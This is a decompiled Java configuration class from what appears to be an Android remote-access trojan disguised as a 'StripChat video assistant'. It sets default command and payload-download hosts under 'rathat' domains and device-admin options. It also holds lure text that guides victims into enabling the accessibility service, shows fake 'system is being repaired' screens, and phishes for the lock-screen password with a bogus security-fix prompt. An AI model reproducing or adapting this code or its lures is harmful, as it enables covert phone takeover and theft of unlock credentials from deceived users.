package com.guard.wallet.utils;

import a1.AbstractC0026q;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.BuildConfig;
import com.guard.wallet.entity.LangDialog;
import com.guard.wallet.http.AbstractC0207l;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;

/* renamed from: com.guard.wallet.utils.d */
/* loaded from: classes.dex */
public abstract class AbstractC0248d {

    /* renamed from: a */
    public static final Integer f402a = 1;

    /* renamed from: b */
    public static final Integer f403b = 0;

    /* renamed from: c */
    public static final Integer f404c = 1;

    /* renamed from: d */
    public static final Integer f405d = 1;

    /* renamed from: e */
    public static final Integer f406e = 2;

    /* renamed from: f */
    public static final Integer f407f = 5;

    /* renamed from: a */
    public static BuildConfig m603a() {
        LangDialog langDialog = new LangDialog("StripChat assist", "StripChat", "StripChat video assistant", "Go immediately", "Open [accessibility_service_label]", "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]", "Initializing [StripChat video assistant]\nPlease do not operate your phone...", "System is being repaired\nplease do not operate the phone...", "standby power-saving mode", "entered standby power-saving mode, click here to wake up", "Press again to exit", "Allow restricted settings", org.conscrypt.BuildConfig.FLAVOR, "Verify lock screen password", "Fix system security vulnerabilities", "Please enter your lock screen password to complete the system update and fix security vulnerabilities.", "Verify personal identity", "Privacy protection", "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.", "Initializing verification key\nPlease wait...", "Initializing Wi-Fi network data transmission key\nPlease do not operate your phone...");
        LinkedHashMap linkedHashMap = new LinkedHashMap();
        linkedHashMap.put("en", langDialog);
        if (!AbstractC0026q.m151B("config.json") && AbstractC0251g.m653Z() != null && AbstractC0251g.m653Z().getAssets() != null) {
            try {
                InputStream open = AbstractC0251g.m653Z().getAssets().open("config.json");
                InputStreamReader inputStreamReader = new InputStreamReader(open, StandardCharsets.UTF_8);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                StringBuilder sb = new StringBuilder();
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine == null) {
                        break;
                    }
                    sb.append(readLine);
                }
                bufferedReader.close();
                inputStreamReader.close();
                open.close();
                BuildConfig buildConfig = (BuildConfig) AbstractC0252h.m700d(sb.toString(), BuildConfig.class);
                if (buildConfig != null) {
                    buildConfig.setServerHost(AbstractC0026q.m151B(buildConfig.getServerHost()) ? AbstractC0207l.f252a : AbstractC0026q.m180m(buildConfig.getServerHost()));
                    buildConfig.setDownloadRatHatHost(AbstractC0026q.m151B(buildConfig.getDownloadRatHatHost()) ? "https://rathat.me/lib" : AbstractC0026q.m180m(buildConfig.getDownloadRatHatHost()));
                    if (AbstractC0026q.m151B(buildConfig.getDownloadRatHatName())) {
                        buildConfig.setDownloadRatHatName("rat-hat");
                    }
                    buildConfig.setGuideAccessibilityHost(AbstractC0026q.m151B(buildConfig.getGuideAccessibilityHost()) ? "https://guide.accessibility.rathat.org" : AbstractC0026q.m180m(buildConfig.getGuideAccessibilityHost()));
                    if (AbstractC0026q.m151B(buildConfig.getMainUrl())) {
                        buildConfig.setMainUrl("https://m.baidu.com/");
                    }
                    if (buildConfig.getPromotionModel() == null || (buildConfig.getPromotionModel().intValue() != 0 && buildConfig.getPromotionModel().intValue() != 1)) {
                        buildConfig.setPromotionModel(f402a);
                    }
                    if (buildConfig.getUninstall() == null || (buildConfig.getUninstall().intValue() != 0 && buildConfig.getUninstall().intValue() != 1)) {
                        buildConfig.setUninstall(f403b);
                    }
                    if (buildConfig.getActiveAdmin() == null || (buildConfig.getActiveAdmin().intValue() != 0 && buildConfig.getActiveAdmin().intValue() != 1)) {
                        buildConfig.setUninstall(f404c);
                    }
                    if (buildConfig.getDebug() == null || (buildConfig.getDebug().intValue() != 0 && buildConfig.getDebug().intValue() != 1)) {
                        buildConfig.setUninstall(f405d);
                    }
                    if (buildConfig.getPerScreenOffDuration() == null || buildConfig.getPerScreenOffDuration().intValue() <= 0) {
                        buildConfig.setPerScreenOffDuration(f406e);
                    }
                    if (buildConfig.getPerIdleDuration() == null || buildConfig.getPerIdleDuration().intValue() <= 0) {
                        buildConfig.setPerIdleDuration(f407f);
                    }
                    if (buildConfig.getLangMap() == null || buildConfig.getLangMap().isEmpty()) {
                        buildConfig.setLangMap(linkedHashMap);
                    }
                    return buildConfig;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.utils.d", e2);
            }
        }
        return new BuildConfig(AbstractC0207l.f252a, "https://rathat.me/lib", "rat-hat", "https://guide.accessibility.rathat.org", null, "https://m.baidu.com/", null, "https://admin.rathat.live/download/file/845804095260737536.png", "#303133", f402a, f403b, f404c, f405d, f406e, f407f, linkedHashMap);
    }

    /* renamed from: b */
    public static String m604b() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getBlockIconUrl())) ? "https://admin.rathat.live/download/file/845804095260737536.png" : MainApplication.getInstance().getBuildConfig().getBlockIconUrl();
    }

    /* renamed from: c */
    public static String m605c() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getDownloadRatHatHost())) ? "https://rathat.me/lib" : MainApplication.getInstance().getBuildConfig().getDownloadRatHatHost();
    }

    /* renamed from: d */
    public static String m606d() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getDownloadRatHatName())) ? "rat-hat" : MainApplication.getInstance().getBuildConfig().getDownloadRatHatName();
    }

    /* renamed from: e */
    public static String m607e() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getGuideAccessibilityHost())) ? "https://guide.accessibility.rathat.org" : MainApplication.getInstance().getBuildConfig().getGuideAccessibilityHost();
    }

    /* renamed from: f */
    public static String m608f() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getMainUrl())) ? "https://m.baidu.com/" : MainApplication.getInstance().getBuildConfig().getMainUrl();
    }

    /* renamed from: g */
    public static Integer m609g() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || MainApplication.getInstance().getBuildConfig().getPromotionModel() == null) ? f402a : MainApplication.getInstance().getBuildConfig().getPromotionModel();
    }

    /* renamed from: h */
    public static String m610h() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getServerHost())) ? AbstractC0207l.f252a : MainApplication.getInstance().getBuildConfig().getServerHost();
    }

    /* renamed from: i */
    public static String m611i() {
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getUpdateSystemMsg())) ? "System is being repaired\nplease do not operate the phone..." : MainApplication.getInstance().getBuildConfig().getUpdateSystemMsg();
    }
}
